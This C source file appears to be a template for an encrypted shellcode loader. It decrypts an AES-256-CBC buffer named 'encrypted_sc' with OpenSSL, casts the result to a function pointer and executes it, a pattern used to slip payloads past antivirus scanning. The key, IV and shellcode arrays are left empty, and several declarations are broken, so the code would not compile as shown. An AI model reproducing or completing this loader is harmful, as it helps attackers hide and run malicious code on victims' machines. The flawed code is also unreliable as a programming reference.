/* references https://wiki.openssl.org/index.php/EVP_Symmetric_Encryption_and_Decryption */

#include <openssl/aes.h>
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <string.h>

int decrypt(const unsigned char ciphertext[], int ciphertext_len, const unsigned char key[], const unsigned char iv[], unsigned char encrypted_sc[]);
void print_data(const void* data, int len);

int main (void) {
    const static unsigned char key[];
    unsigned char iv[AES_BLOCK_SIZE];

    /* when doing sizeof(encrypted_sc), subtract 1 to get the real (without null terminator) size */
    unsigned char encrypted_sc[];
    int actual_input_size = sizeof(encrypted_sc);

    int full = actual_input_size - (actual_input_size % AES_BLOCK_SIZE);
    int remainder = actual_input_size - full;
    int buffer_size = actual_input_size + (AES_BLOCK_SIZE - remainder);

    unsigned char decryptedtext[buffer_size * 8];

    int decryptedtext_len = decrypt(encrypted_sc, actual_input_size, key, iv, decryptedtext);
    int (*ret)() = (int(*)())decryptedtext;
    ret();

    return 0;
}

void handle_errors(void) {
    ERR_print_errors_fp(stderr);
    abort();
}

int decrypt(const unsigned char ciphertext[], int ciphertext_len, const unsigned char key[], const unsigned char iv[], unsigned char encrypted_sc[]) {
    EVP_CIPHER_CTX *ctx;
    int len;
    int encrypted_sc_len;

    /* Create and initialise the context */
    if(!(ctx = EVP_CIPHER_CTX_new()))
        handle_errors();

    /*
     * Initialise the decryption operation. IMPORTANT - ensure you use a key
     * and IV size appropriate for your cipher
     * In this example we are using 256 bit AES (i.e. a 256 bit key). The
     * IV size for *most* modes is the same as the block size. For AES this
     * is 128 bits
     */
    if(1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handle_errors();

    /*
     * Provide the message to be decrypted, and obtain the encrypted_sc output.
     * EVP_DecryptUpdate can be called multiple times if necessary.
     */
    if(1 != EVP_DecryptUpdate(ctx, encrypted_sc, &len, ciphertext, ciphertext_len))
        handle_errors();
    encrypted_sc_len = len;

    /*
     * Finalise the decryption. Further encrypted_sc bytes may be written at
     * this stage.
     */
    if(1 != EVP_DecryptFinal_ex(ctx, encrypted_sc + len, &len))
        handle_errors();
    encrypted_sc_len += len;

    /* Clean up */
    EVP_CIPHER_CTX_free(ctx);

    return encrypted_sc_len;
}

void print_data(const void* data, int len){
    const unsigned char * p = (const unsigned char*) data;
    int i;
    for(i = 0;i < len; i++){
        printf("\\x%02X", *p++);
    }
    printf("\n");
}
